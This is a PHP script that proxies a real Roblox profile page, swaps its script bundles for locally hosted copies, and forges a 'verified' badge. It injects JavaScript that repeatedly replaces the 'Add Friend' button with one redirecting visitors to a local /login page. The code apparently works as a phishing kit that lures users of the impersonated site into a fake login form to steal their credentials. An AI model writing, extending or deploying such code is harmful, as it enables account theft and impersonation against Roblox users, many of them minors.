<?php
$directory = 447449877;
				if (!$directory) {
					die(header("Location: /request-error?code=404"));
				}

				$curl = curl_init("https://www.roblox.com/users/".$directory."/profile");
				curl_setopt_array($curl, [
					CURLOPT_RETURNTRANSFER => true,
					CURLOPT_FOLLOWLOCATION => true,
					CURLOPT_HEADER => true,
					CURLOPT_USERAGENT => 'Mozilla/5.0'
				]);
				$result = curl_exec($curl);
				if ($result === false) {
					http_response_code(502);
					echo 'Failed to load profile';
					exit;
				}
				$headerLen = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
				$body = substr($result, $headerLen);
				if (!$body) {
					http_response_code(502);
					echo 'Profile response was empty';
					exit;
				}

				$body = preg_replace(
					'/<div id="profile-header-container"([^>]*)data-profileuserid="[^"]*"([^>]*)>/i',
				'<div id="profile-header-container"$1data-profileuserid=447449877$2>',
					$body
				);

				$body = preg_replace(
    				'/<script[^>]+data-bundlename="EnvironmentUrls"[^>]+src="[^"]+"[^>]*><\/script>/i',
    			'<script src="/js/EnvironmentUrls.js"></script>',
   					$body
				);	

				/* Thumbnails3d */
				$body = preg_replace(
    				'/<script[^>]+data-bundlename="Thumbnails3d"[^>]+src="[^"]+"[^>]*><\/script>/i',
    			'<script src="/js/Thumbnails3d.js"></script>',
    				$body
				);

/* Navigation */
				$body = preg_replace(
    				'/<script[^>]+data-bundlename="Navigation"[^>]+src="[^"]+"[^>]*><\/script>/i',
    			'<script src="/js/Navigation.js"></script>',
    				$body
				);

/* ProfilePlatform */
				$body = preg_replace(
    				'/<script[^>]+data-bundlename="ProfilePlatform"[^>]+src="[^"]+"[^>]*><\/script>/i',
    			'<script src="/js/ProfilePlatform.js"></script>',
    				$body
				);

				$script = '<script>(function(){const R="/login?returnUrl="+encodeURIComponent(location.href);function b(){const e=document.createElement("button");e.className="MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedSecondary MuiButton-sizeMedium";e.id="friend-button";e.innerHTML=\'<span>Add Friend</span><span class="MuiTouchRipple-root"></span>\';e.onclick=()=>location.href=R;return e}function r(){const c=document.querySelector(".profile-header-buttons");if(!c)return;const o=c.querySelector("#friend-button");if(o&&!o.dataset.r){const n=b();c.replaceChild(n,o);n.dataset.r=1}}setInterval(r,300)})();</script>';

				$body = str_replace('</body>', $script.'</body>', $body);

				$verified = true;

				$rbxJs = 'https://js.rbxcdn.com/88bc2b6de1bc71ddeda1f7bb6647e8409ed4d0642c9eadb62a61eb8c8a000d82.js';
				$body = str_replace(
					$rbxJs,
					$verified ? '/js/verified/profileVerified.js' : '/js/verified/profileNotVerified.js',
					$body
				);
				echo $body;

